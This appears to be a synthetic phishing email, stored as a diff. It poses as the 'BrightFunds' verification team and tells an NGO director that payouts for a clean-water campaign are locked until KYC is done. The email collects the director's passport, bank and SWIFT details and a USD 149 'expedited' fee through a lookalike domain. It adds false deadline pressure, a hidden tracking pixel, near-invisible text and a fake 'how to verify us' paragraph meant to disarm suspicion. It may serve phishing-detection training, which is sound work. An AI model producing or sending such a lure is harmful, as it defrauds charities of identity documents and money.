@@ -1,0 +1,80 @@
+From: "BrightFunds | Project Verification Team" <verify@brightfunds-campaign.example>
+To: director@ngowater.example
+Cc: finance@ngowater.example
+Reply-To: verification.desk@bf-verified.example
+Disposition-Notification-To: verify@brightfunds-campaign.example
+Date: Mon, 19 Apr 2027 08:15:00 +0000
+Message-ID: <0807-b94@synth.example>
+Subject: [VERIFICATION] Clean Water Initiative - Payout Ready - Organization KYC Package Due Before Giving Tuesday Onboarding (10 Days)
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:-apple-system,'Segoe UI',sans-serif;font-size:14px">
+<p>NGO Director, Finance Team,</p>
+
+<p style="background:#E8F5E9;border-left:4px solid #1B5E20;padding:12px">
+<b>YOUR CAMPAIGN PASSED INITIAL REVIEW — VERIFICATION PACKAGE DUE.</b>
+"Clean Water Initiative — Borehole Restoration" (campaign <b>CW-2027-4184</b>) passed BrightFunds'
+initial review and is queued for <b>Giving Tuesday onboarding</b> (the year's highest-donation day,
+11 days out). Before payouts unlock, the platform's nonprofit verification (KYC) must be completed.
+<b>Unverified campaigns in the Giving Tuesday queue lose their onboarding slot</b> to the verified
+waitlist (currently 40+ campaigns).
+</p>
+
+<h3>1. Campaign Status</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:260px">Campaign</td><td><b>CW-2027-4184</b> — Clean Water Initiative: Borehole Restoration</td></tr>
+<tr><td style="background:#f5f5f5">Organizer</td><td>NGO Water (your organization, registered 2019)</td></tr>
+<tr><td style="background:#f5f5f5">Initial review</td><td>Passed 12 April (program staff rating 4.6/5)</td></tr>
+<tr><td style="background:#f5f5f5">Goal</td><td>USD 120,000 (28 boreholes, Turkana County)</td></tr>
+<tr><td style="background:#f5f5f5">Payout status</td><td><b style="color:#e00">Locked pending verification</b></td></tr>
+<tr><td style="background:#f5f5f5">Onboarding slot</td><td>Giving Tuesday — <b>10 days</b> to verify or slot passes to waitlist</td></tr>
+</table>
+
+<h3>2. Verification Package (Nonprofit KYC)</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Item</th><th>Purpose</th></tr>
+<tr><td>Organization registration certificate</td><td>Legal existence check</td></tr>
+<tr><td>Director's passport or national ID (bio page)</td><td>Authorized-representative verification</td></tr>
+<tr><td><b>Payout bank account details + swift</b></td><td>Donation disbursement setup</td></tr>
+<tr><td>Bank-issued account ownership proof</td><td>Matches organization to account</td></tr>
+<tr><td>Expedited review (optional)</td><td>48h processing vs standard 7-9 days — USD 149</td></tr>
+</table>
+
+<h3>3. Submission Portal</h3>
+<p style="text-align:center;margin:18px 0">
+<a href="https://bf-verified.example/kyc/CW-2027-4184/upload" style="display:inline-block;background:#00C4B3;color:#111;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Upload Verification Package</a>
+</p>
+<p style="font-size:13px;color:#666;text-align:center">Platform help center: https://support.brightfunds.example/verification (same portal as your campaign dashboard)</p>
+
+<h3>4. Timeline</h3>
+<ul>
+<li>Standard verification: 7-9 business days — <b>too late for Giving Tuesday</b></li>
+<li>Expedited verification: 48 hours — deadline <b>this Wednesday</b> to hold the slot</li>
+<li>Slot passes to waitlist automatically at close of business Wednesday</li>
+</ul>
+
+<p style="font-size:14px;background:#E8F5E9;padding:12px">A platform email collecting passports and
+bank details deserves scrutiny — nonprofit fraud exists on both sides, and your caution protects
+donors and your organization alike. Checks: the submission page is scoped to campaign CW-2027-4184
+and shows your campaign title before any upload field; the verification requirements mirror the
+help center's published list; and your campaign dashboard's "Verification" tab shows the same
+locked-payout status. The expedited fee and the Wednesday deadline are the queue's arithmetic:
+40+ verified campaigns are waiting for your slot.</p>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://bf-verified.example/px/kyc.gif?c=CW-2027-4184&amp;r=director%40ngowater.example" width=1 height=1 alt="">
+</div>
+
+<p style="font-size:0.5px;color:#fff;opacity:0.02">Fiscal sponsor lane: campaigns under a fiscal sponsor may submit the sponsor's package covering multiple campaigns at bf-verified.example/sponsor (single review, all linked campaigns unlock together).</p>
+
+<h3>5. Contact</h3>
+<p>Verification desk: verification.desk@bf-verified.example<br>
+Campaign reference: CW-2027-4184 · Verification queue hours 06:00-22:00 UTC</p>
+
+<div style="border-top:1px solid #ddd;padding-top:10px;margin-top:18px;font-size:11px;color:#999">
+BrightFunds | Project Verification Team · This notice concerns campaign CW-2027-4184 only.<br>
+Verification requirements and fee schedule are published in the help center.
+</div>
+
+</body></html>
